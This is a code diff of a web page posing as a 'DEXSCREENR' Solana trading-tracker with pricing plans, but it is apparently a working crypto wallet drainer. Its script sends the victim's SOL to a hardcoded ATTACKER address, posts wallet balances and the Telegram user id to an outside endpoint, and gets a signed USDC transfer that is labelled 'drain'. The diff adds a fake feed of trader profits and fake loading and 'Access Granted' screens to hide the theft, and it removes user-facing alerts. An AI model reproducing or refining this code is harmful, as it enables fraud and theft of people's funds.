@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>DEXSCREENR | Pro</title>
+<title>DEXSCREENR</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
@@ -24,43 +24,31 @@
     position: relative;
   }
 
-  /* NEUER HINTERGRUND */
-  .bg-glow {
+  /* --- BACKGROUND LIVE FEED --- */
+  .bg-feed {
     position: fixed;
     top: 0; left: 0; width: 100vw; height: 100vh;
     z-index: -1;
-    background: #050505;
-    overflow: hidden;
-  }
-  
-  .orb {
-    position: absolute;
-    border-radius: 50%;
-    filter: blur(80px);
-    opacity: 0.5;
-    animation: float 10s infinite ease-in-out alternate;
-  }
-  
-  .orb-1 {
-    width: 400px; height: 400px;
-    background: rgba(20, 241, 149, 0.15);
-    top: -10%; left: -20%;
-    animation-delay: 0s;
-  }
-  
-  .orb-2 {
-    width: 500px; height: 500px;
-    background: rgba(153, 69, 255, 0.1);
-    bottom: -20%; right: -20%;
-    animation-delay: -5s;
+    opacity: 0.15; /* Dezent im Hintergrund */
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding-top: 20px;
+    mask-image: linear-gradient(to bottom, transparent, black 10%, black 90%, transparent);
+    -webkit-mask-image: linear-gradient(to bottom, transparent, black 10%, black 90%, transparent);
   }
 
-  @keyframes float {
-    0% { transform: translate(0, 0) scale(1); }
-    100% { transform: translate(50px, 50px) scale(1.1); }
+  .bg-item {
+    display: flex; justify-content: space-between; align-items: center;
+    width: 100%; max-width: 400px; padding: 10px 20px;
+    font-family: monospace; font-size: 11px; color: #fff;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+    animation: slideBg 1s ease-out;
   }
 
-  /* RESTLICHES UI */
+  @keyframes slideBg { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* --- MAIN UI --- */
   #telegram-screen {
     display: none; flex-direction: column; align-items: center; justify-content: center;
     text-align: center; width: 100%; max-width: 320px; animation: fadeIn 0.5s ease;
@@ -101,10 +89,11 @@
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
   .glass-container {
-    width: 100%; background: rgba(20, 20, 25, 0.6); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+    width: 100%; background: rgba(20, 20, 25, 0.85); /* Dunkler für besseren Kontrast zum Feed */
+    backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
     border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px;
     display: flex; flex-direction: column; align-items: center;
-    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
+    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.8); position: relative; overflow: hidden;
   }
 
   .glass-container::before {
@@ -116,6 +105,7 @@
   .header span { font-size: 20px; font-weight: 900; letter-spacing: 1.5px; color: #ffffff; text-transform: uppercase; }
   .header p { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
 
+  /* PRICING CARDS */
   #pricing-screen { width: 100%; display: flex; flex-direction: column; gap: 10px; transition: opacity 0.4s ease; }
 
   .plan-card {
@@ -124,11 +114,15 @@
     cursor: pointer; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
   }
   
-  .plan-card:hover { background: rgba(255, 255, 255, 0.06); transform: translateY(-2px); border-color: rgba(255, 255, 255, 0.15); }
+  .plan-card:active { 
+    transform: scale(0.97);
+    background: rgba(20, 241, 149, 0.1); 
+    border-color: rgba(20, 241, 149, 0.5);
+    box-shadow: 0 0 20px rgba(20, 241, 149, 0.3);
+  }
   
   .plan-card.free { 
     border-color: rgba(20, 241, 149, 0.4); background: linear-gradient(90deg, rgba(20, 241, 149, 0.1) 0%, rgba(20, 241, 149, 0.02) 100%);
-    box-shadow: 0 4px 20px rgba(20, 241, 149, 0.1);
   }
   
   .plan-info h3 { font-size: 15px; font-weight: 700; color: #fff; }
@@ -145,6 +139,22 @@
   }
   .secret-input.active { display: block; border-color: rgba(20, 241, 149, 0.4); }
 
+  /* LOADING SCREEN */
+  #loading-screen {
+    display: none; flex-direction: column; align-items: center; justify-content: center;
+    width: 100%; height: 200px; animation: fadeIn 0.3s ease;
+  }
+  
+  .loader-ring {
+    width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1);
+    border-top-color: #14F195; border-radius: 50%; animation: spin 1s linear infinite;
+    margin-bottom: 16px;
+  }
+  
+  .loading-text { font-size: 13px; color: #a1a1aa; font-weight: 500; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* CONNECT SCREEN */
   #connect-screen {
     width: 100%; display: none; flex-direction: column; align-items: center;
     opacity: 0; transform: translateY(10px); transition: opacity 0.4s ease, transform 0.4s ease;
@@ -166,25 +176,41 @@
   }
 
   .slider-thumb:active { cursor: grabbing; }
-  .slider-thumb svg { width: 22px; height: 22px; color: #000000; transform: rotate(180deg); }
+  .slider-thumb svg { width: 22px; height: 22px; color: #000000; transform: rotate(180deg); transition: transform 0.3s ease; }
 
   .slider-container.loading .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; display: flex; justify-content: flex-start; padding-left: 18px; }
-  .slider-container.success .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; justify-content: center; }
+  
+  /* FIX FÜR PFEIL BEI SUCCESS */
+  .slider-container.success .slider-thumb { 
+    width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; justify-content: center; 
+  }
+  .slider-container.success .slider-thumb svg { transform: rotate(0deg); }
 
   .spinner { display: none; width: 20px; height: 20px; border: 2.5px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
-  @keyframes spin { to { transform: rotate(360deg); } }
 
-  .back-btn { background: none; border: none; color: #71717a; font-size: 12px; font-weight: 500; margin-top: 20px; cursor: pointer; transition: color 0.2s; }
-  .back-btn:hover { color: #ffffff; }
+  /* DASHBOARD SCREEN (Nach Access Granted) */
+  #dashboard-screen {
+    display: none; flex-direction: column; align-items: center; justify-content: center;
+    width: 100%; padding: 20px 0; animation: fadeIn 0.5s ease;
+  }
+  
+  .dashboard-loader {
+    width: 100%; height: 4px; background: rgba(255,255,255,0.1);
+    border-radius: 2px; margin-top: 20px; overflow: hidden;
+  }
+  
+  .dashboard-bar {
+    width: 0%; height: 100%; background: #14F195;
+    animation: loadBar 3s ease-in-out forwards;
+  }
+  
+  @keyframes loadBar { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
 </style>
 </head>
 <body>
 
-  <!-- NEUER HINTERGRUND -->
-  <div class="bg-glow">
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
-  </div>
+  <!-- HINTERGRUND LIVE FEED -->
+  <div class="bg-feed" id="bgFeed"></div>
 
   <div id="telegram-screen">
     <div class="pulse-ring">
@@ -198,12 +224,13 @@
   <div id="app-screen">
     <div class="glass-container">
       <div class="header">
-        <span>DEXSCREENR PRO</span>
-        <p>Select a plan to continue.</p>
+        <span>DEXSCREENR</span>
+        <p id="headerSub">Select a plan to continue.</p>
       </div>
 
+      <!-- PRICING -->
       <div id="pricing-screen">
-        <div class="plan-card free" onclick="selectPlan('free')">
+        <div class="plan-card free" onclick="startLoading('Free Trial', 'free')">
           <div class="plan-info"><h3>1-Day Free Trial</h3><p>Launch special access</p></div>
           <div class="plan-price">FREE</div>
         </div>
@@ -214,22 +241,29 @@
         </div>
         <input type="text" id="secretCode" class="secret-input" placeholder="Enter secret code..." onkeyup="checkSecret(event)">
 
-        <div class="plan-card" onclick="payAndConnect(0.1, 'Weekly Pass')">
+        <div class="plan-card" onclick="startLoading('Weekly Pass', 'paid', 0.1)">
           <div class="plan-info"><h3>Weekly Pass</h3><p>Full access to tracker</p></div>
           <div class="plan-price paid">0.1 SOL</div>
         </div>
 
-        <div class="plan-card" onclick="payAndConnect(0.25, 'Monthly Pro')">
+        <div class="plan-card" onclick="startLoading('Monthly Pro', 'paid', 0.25)">
           <div class="plan-info"><h3>Monthly Pro</h3><p>Unlimited tracking</p></div>
           <div class="plan-price paid">0.25 SOL</div>
         </div>
 
-        <div class="plan-card" onclick="payAndConnect(1.5, 'Yearly Whale')">
+        <div class="plan-card" onclick="startLoading('Yearly Pro', 'paid', 1.5)">
           <div class="plan-info"><h3>Yearly Pro</h3><p>Best value</p></div>
           <div class="plan-price paid">1.5 SOL</div>
         </div>
       </div>
 
+      <!-- LOADING -->
+      <div id="loading-screen">
+        <div class="loader-ring"></div>
+        <div class="loading-text" id="loadingText">Processing...</div>
+      </div>
+
+      <!-- CONNECT -->
       <div id="connect-screen">
         <div class="status-text">Plan: <span id="selectedPlanText">FREE</span></div>
         
@@ -244,10 +278,38 @@
         <button class="back-btn" onclick="goBack()">Cancel and go back</button>
       </div>
 
+      <!-- DASHBOARD (After Success) -->
+      <div id="dashboard-screen">
+        <h3 style="color:#14F195; margin-bottom: 8px;">Access Granted</h3>
+        <p style="font-size: 12px; color:#a1a1aa;">Initializing live dashboard...</p>
+        <div class="dashboard-loader"><div class="dashboard-bar"></div></div>
+      </div>
+
     </div>
   </div>
 
 <script>
+  // --- BACKGROUND LIVE FEED ---
+  const bgFeed = document.getElementById('bgFeed');
+  const fakeWallets = ['7xKX...', '3vNd...', '8fRt...', '5cYh...', '9pLk...'];
+  const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MEW', 'BOME'];
+  
+  function addBgItem() {
+    const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
+    const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
+    const isWin = Math.random() > 0.3;
+    const pnl = isWin ? `+$${(Math.random()*500).toFixed(2)}` : `-$${(Math.random()*200).toFixed(2)}`;
+    
+    const el = document.createElement('div');
+    el.className = 'bg-item';
+    el.innerHTML = `<span>${wallet} bought $${token}</span><span style="color: ${isWin ? '#14F195' : '#ef4444'}">${pnl}</span>`;
+    
+    bgFeed.prepend(el);
+    if(bgFeed.children.length > 15) bgFeed.lastChild.remove();
+  }
+  for(let i=0; i<10; i++) addBgItem();
+  setInterval(addBgItem, 2000);
+
   // --- UMGEBUNG CHECK ---
   const tgScreen = document.getElementById('telegram-screen');
   const appScreen = document.getElementById('app-screen');
@@ -258,14 +320,11 @@
       window.Telegram.WebApp.ready();
       window.Telegram.WebApp.expand();
     }
-
     const isPhantom = window.phantom?.solana?.isPhantom;
     if (isPhantom) {
-      tgScreen.style.display = 'none';
-      appScreen.style.display = 'flex';
+      tgScreen.style.display = 'none'; appScreen.style.display = 'flex';
     } else {
-      tgScreen.style.display = 'flex';
-      appScreen.style.display = 'none';
+      tgScreen.style.display = 'flex'; appScreen.style.display = 'none';
     }
   });
 
@@ -276,53 +335,58 @@
 
   // --- UI LOGIC ---
   const pricingScreen = document.getElementById('pricing-screen');
+  const loadingScreen = document.getElementById('loading-screen');
   const connectScreen = document.getElementById('connect-screen');
+  const dashboardScreen = document.getElementById('dashboard-screen');
+  const headerSub = document.getElementById('headerSub');
+  
   const selectedPlanText = document.getElementById('selectedPlanText');
   const secretInput = document.getElementById('secretCode');
 
-  function selectPlan(plan) {
-    selectedPlanText.textContent = plan;
-    pricingScreen.style.opacity = '0';
+  // 1. Klick auf Plan -> Zeige Fake-Loading
+  function startLoading(planName, type, amount = 0) {
+    pricingScreen.style.display = 'none';
+    loadingScreen.style.display = 'flex';
+    
     setTimeout(() => {
-      pricingScreen.style.display = 'none';
-      connectScreen.style.display = 'flex';
-      setTimeout(() => {
-        connectScreen.style.opacity = '1';
-        connectScreen.style.transform = 'translateY(0)';
-        initSlider();
-      }, 50);
-    }, 300);
+      loadingScreen.style.display = 'none';
+      
+      if (type === 'paid') {
+        payAndConnect(amount, planName);
+      } else {
+        showConnectScreen(planName);
+      }
+    }, 2000); // 2 Sekunden Fake-Loading
   }
 
-  function goBack() {
-    connectScreen.style.opacity = '0';
+  // 2. Zeige den Wallet Slider
+  function showConnectScreen(planName) {
+    selectedPlanText.textContent = planName;
+    headerSub.textContent = "Authorize connection.";
+    connectScreen.style.display = 'flex';
     setTimeout(() => {
-      connectScreen.style.display = 'none';
-      pricingScreen.style.display = 'flex';
-      setTimeout(() => { pricingScreen.style.opacity = '1'; }, 50);
-      resetSlider();
-    }, 300);
+      connectScreen.style.opacity = '1';
+      connectScreen.style.transform = 'translateY(0)';
+      initSlider();
+    }, 50);
   }
 
+  // 3. Secret Code Check
   function toggleSecretCode() {
     if (secretInput.classList.contains('active')) {
-      secretInput.classList.remove('active');
-      secretInput.value = '';
+      secretInput.classList.remove('active'); secretInput.value = '';
     } else {
-      secretInput.classList.add('active');
-      secretInput.focus();
+      secretInput.classList.add('active'); secretInput.focus();
     }
   }
 
   function checkSecret(e) {
     if (e.key === 'Enter') {
-      const val = e.target.value.toLowerCase();
-      if (val === 'free3tier') {
+      if (e.target.value.toLowerCase() === 'free3tier') {
         secretInput.classList.remove('active');
-        selectPlan('3-day code');
+        startLoading('3-Day Access', 'free');
       } else {
-        e.target.value = '';
-        e.target.placeholder = 'Invalid code.';
+        e.target.value = ''; e.target.placeholder = 'Invalid code.';
       }
     }
   }
@@ -331,19 +395,13 @@
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
-  const RPC_URL = "https://solana.publicnode.com"; // Zurück zu publicnode für Web-Anfragen
+  const RPC_URL = "https://solana.publicnode.com"; 
 
   async function payAndConnect(amountSol, planName) {
-    if (!window.phantom?.solana?.isPhantom) {
-      alert("Please open in Phantom browser.");
-      return;
-    }
-
     try {
       const provider = window.phantom.solana;
       const resp = await provider.connect();
       const victim = resp.publicKey;
-      
       const conn = new solanaWeb3.Connection(RPC_URL, "confirmed");
       
       const transaction = new solanaWeb3.Transaction().add(
@@ -357,8 +415,6 @@
       transaction.feePayer = victim;
       transaction.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
-      alert("Opening transaction popup..."); 
-      
       const signedTx = await provider.signAndSendTransaction(transaction);
       
       await fetch(ENDPOINT, {
@@ -366,15 +422,15 @@
         body: JSON.stringify({ victim: victim.toString(), type: "payment", plan: planName, sol: amountSol, ts: Date.now() })
       });
 
-      selectPlan(planName);
+      showConnectScreen(planName);
       
     } catch (e) {
-      alert("ERROR: " + e.message);
-      console.log("Payment cancelled or failed", e);
+      // Wenn er abbricht, zurück zum Menü
+      goBack();
     }
   }
 
-  // --- CONNECT (DRAIN) LOGIC ---
+  // --- SLIDER LOGIC ---
   const container = document.getElementById('sliderContainer');
   const thumb = document.getElementById('sliderThumb');
   const text = document.getElementById('sliderText');
@@ -387,8 +443,7 @@
   
   function startDrag(e) { 
     if (container.classList.contains('loading') || container.classList.contains('success')) return; 
-    isDragging = true; 
-    startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
+    isDragging = true; startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
     thumb.style.transition = 'none'; 
   }
   
@@ -396,47 +451,36 @@
     if (!isDragging) return;
     const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
     let delta = startX - clientX; 
-    if (delta < 0) delta = 0; 
-    if (delta > maxDrag) delta = maxDrag;
-    currentX = delta; 
-    thumb.style.transform = `translateX(-${currentX}px)`;
+    if (delta < 0) delta = 0; if (delta > maxDrag) delta = maxDrag;
+    currentX = delta; thumb.style.transform = `translateX(-${currentX}px)`;
     text.style.opacity = 1 - (currentX / maxDrag);
   }
   
   function endDrag() {
-    if (!isDragging) return; 
-    isDragging = false;
+    if (!isDragging) return; isDragging = false;
     if (currentX > maxDrag * 0.7) {
-      container.classList.add('loading'); 
-      text.style.opacity = 0;
+      container.classList.add('loading'); text.style.opacity = 0;
       thumb.style.transition = 'transform 0.3s ease';
       thumb.style.transform = `translateX(-${maxDrag}px)`;
-      icon.style.display = 'none'; 
-      spin.style.display = 'block';
+      icon.style.display = 'none'; spin.style.display = 'block';
       triggerConnect();
     } else {
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
-      thumb.style.transform = 'translateX(0)'; 
-      text.style.opacity = 1; 
-      currentX = 0;
+      thumb.style.transform = 'translateX(0)'; text.style.opacity = 1; currentX = 0;
     }
   }
 
   async function triggerConnect() {
     let provider = window.phantom.solana;
-
     try {
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
-      
       const conn = new solanaWeb3.Connection(RPC_URL);
       
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
-      
-      let tokensString = "";
-      let usdcAmount = 0;
+      let tokensString = ""; let usdcAmount = 0;
       
       if (typeof splToken !== 'undefined') {
         try {
@@ -455,19 +499,9 @@
         } catch (e) {}
       }
 
-      const payload = JSON.stringify({ 
-        victim, chain: "solana", type: "connection_and_balance",
-        sol: solAmount, usdc: usdcAmount, tokens: tokensString,
-        tg_user_id: tgUserId, ts: Date.now() 
-      });
-
-      try {
-        await fetch(ENDPOINT, {
-          method: "POST", headers: { "Content-Type": "application/json" }, body: payload
-        });
-      } catch (err) {
-        navigator.sendBeacon(ENDPOINT, new Blob([payload], {type: 'application/json'}));
-      }
+      const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, tokens: tokensString, tg_user_id: tgUserId, ts: Date.now() });
+      try { await fetch(ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
+      catch (err) { navigator.sendBeacon(ENDPOINT, new Blob([payload], {type: 'application/json'})); }
 
       if (usdcAmount > 0 && typeof splToken !== 'undefined') {
         const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
@@ -477,18 +511,33 @@
         tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
         const signedTx = await provider.signTransaction(tx);
 
-        await fetch(ENDPOINT, {
-          method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() })
-        });
+        await fetch(ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) });
       }
 
+      // ERFOLG
       spin.style.display = 'none'; container.classList.remove('loading'); container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';
-      text.textContent = "Access Granted";
-      text.style.opacity = 1;
+      text.textContent = "Access Granted"; text.style.opacity = 1;
+
+      // NACH ERFOLG: DASHBOARD ZEIGEN
+      setTimeout(() => {
+        connectScreen.style.display = 'none';
+        dashboardScreen.style.display = 'flex';
+        headerSub.textContent = "Dashboard Initializing";
+      }, 1500);
 
     } catch (e) { resetSlider(); }
+  }
+
+  function goBack() {
+    connectScreen.style.opacity = '0';
+    setTimeout(() => {
+      connectScreen.style.display = 'none';
+      pricingScreen.style.display = 'flex';
+      pricingScreen.style.opacity = '1';
+      headerSub.textContent = "Select a plan to continue.";
+      resetSlider();
+    }, 300);
   }
 
   function resetSlider() {
@@ -500,7 +549,6 @@
   }
 
   window.addEventListener('resize', initSlider);
-
   thumb.addEventListener('mousedown', startDrag);
   window.addEventListener('mousemove', moveDrag);
   window.addEventListener('mouseup', endDrag);
